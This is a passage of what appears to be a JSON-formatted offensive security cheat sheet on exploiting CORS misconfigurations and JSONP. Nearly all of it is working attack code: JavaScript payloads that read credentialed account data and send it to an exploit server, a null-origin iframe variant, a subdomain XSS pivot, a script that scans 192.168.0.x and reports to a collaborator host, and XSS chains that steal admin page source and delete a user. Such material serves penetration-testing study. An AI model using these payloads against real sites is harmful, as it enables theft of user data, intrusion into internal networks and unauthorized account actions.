        {
            "type": "hint",
            "variant": "info",
            "content": "In any site disclosing users & passwords (or other sensitive info), try CORS."
        },
        {
            "heading": "Exploitation & Methodology",
            "type": "code_block",
            "content": [
                "# Simple test",
                "curl --head -s 'http://example.com/api/v1/secret' -H 'Origin: http://evil.com'",
                "",
                "# Same-Origin Policy (SOP) Exceptions:",
                "• Some objects are writable but not readable cross-domain (location, location.href).",
                "• Some objects are readable but not writable cross-domain (window.length, closed property).",
                "• The replace function can generally be called cross-domain on the location object.",
                "• Functions like close, blur, focus, and postMessage can be called cross-domain.",
                "",
                "# Access-Control-Allow-Origin header is included in the response to identify permitted origins.",
                "# Browsers compare this with the requesting site's origin to permit/deny access.",
                "",
                "# Real-world example: https://hackerone.com/reports/235200",
                "",
                "# Attack Scenario 1: Basic Origin Reflection",
                "1. Identify AJAX requests (e.g., /accountDetails) returning Access-Control-Allow-Credentials.",
                "2. Test origin reflection: Add header 'Origin: https://example.com'.",
                "3. If reflected, use the following JS payload:",
                "<script>",
                "   var req = new XMLHttpRequest();",
                "   req.onload = reqListener;",
                "   req.open('get','$url/accountDetails',true);",
                "   req.withCredentials = true;",
                "   req.send();",
                "   function reqListener() {",
                "       location='/log?key='+this.responseText;",
                "   };",
                "</script>",
                "",
                "# Attack Scenario 2: Whitelisted Null Origin Value",
                "1. Resubmit request with 'Origin: null'.",
                "2. If reflected, use an iframe sandbox to generate a null origin request:",
                "<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html, <script>",
                "   var req = new XMLHttpRequest ();",
                "   req.onload = reqListener;",
                "   req.open('get','$url/accountDetails',true);",
                "   req.withCredentials = true;",
                "   req.send();",
                "   function reqListener() {",
                "       location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);",
                "   };",
                "</script>\"></iframe>",
                "",
                "# Attack Scenario 3: Insecure Subdomain/Protocol",
                "1. Test if subdomains or HTTP variants are allowed (Origin: http://subdomain.lab-id).",
                "2. If vulnerable, leverage XSS on a subdomain to pivot:",
                "<script>",
                "   document.location=\"http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1\"",
                "</script>",
                "",
                "# Attack Scenario 4: Pivot Attack (Local Network Scan)",
                "# Step 1: Scan local network",
                "<script>",
                "var q = [], collaboratorURL = 'http://$collaboratorPayload';",
                "for(i=1;i<=255;i++){",
                "  q.push(",
                "  function(url){",
                "    return function(wait){",
                "    fetchUrl(url,wait);",
                "    }",
                "  }('http://192.168.0.'+i+':8080'));",
                "}",
                "for(i=1;i<=20;i++){",
                "  if(q.length)q.shift()(i*100);",
                "}",
                "function fetchUrl(url, wait){",
                "  var controller = new AbortController(), signal = controller.signal;",
                "  fetch(url, {signal}).then(r=>r.text().then(text=>",
                "    {",
                "    location = collaboratorURL + '?ip='+url.replace(/^http:\\/\\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()",
                "  }",
                "  ))",
                "  .catch(e => {",
                "  if(q.length) {",
                "    q.shift()(wait);",
                "  }",
                "  });",
                "  setTimeout(x=>{",
                "  controller.abort();",
                "  if(q.length) {",
                "    q.shift()(wait);",
                "  }",
                "  }, wait);",
                "}",
                "</script>",
                "",
                "# Step 2: Probe for XSS on discovered IP",
                "<script>",
                "function xss(url, text, vector) {",
                "  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf\" value=\"([^\"]+)\"/)[1];",
                "}",
                "function fetchUrl(url, collaboratorURL){",
                "  fetch(url).then(r=>r.text().then(text=>",
                "  {",
                "    xss(url, text, '\"><img src='+collaboratorURL+'?foundXSS=1>');",
                "  }",
                "  ))",
                "}",
                "fetchUrl(\"http://$ip\", \"http://$collaboratorPayload\");",
                "</script>",
                "",
                "# Step 3: Exfiltrate Admin Page Source",
                "<script>",
                "function xss(url, text, vector) {",
                "  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf\" value=\"([^\"]+)\"/)[1];",
                "}",
                "function fetchUrl(url, collaboratorURL){",
                "  fetch(url).then(r=>r.text().then(text=>",
                "  {",
                "    xss(url, text, '\"><iframe src=/admin onload=\"new Image().src=\\''+collaboratorURL+'?code=\\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)\\\">');",
                "  }",
                "  ))",
                "}",
                "fetchUrl(\"http://$ip\", \"http://$collaboratorPayload\");",
                "</script>",
                "",
                "# Step 4: Perform Admin Action (Delete User)",
                "<script>",
                "function xss(url, text, vector) {",
                "  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf\" value=\"([^\"]+)\"/)[1];",
                "}",
                "function fetchUrl(url){",
                "  fetch(url).then(r=>r.text().then(text=>",
                "  {",
                "    xss(url, text, '\"><iframe src=/admin onload=\"var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\\'carlos\\',f.submit()\">');",
                "  }",
                "  ))",
                "}",
                "fetchUrl(\"http://$ip\");",
                "</script>"
            ]
        },
        {
            "heading": "JSONP",
            "type": "code_block",
            "content": [
                "# In GET URL append “?callback=testjsonp”",
                "# Response should be: testjsonp(<json-data>)",
                "",
                "# Exploit Example:",
                "<script>",
                "function testjsonp(myObj) {",
                "  var result = JSON.stringify(myObj)",
                "  document.getElementById(\"demo\").innerHTML = result;",
                "}",
                "</script>",
                "<script src=\"https://<vulnerable-endpoint>?callback=testjsonp\"></script>"
            ]
        },
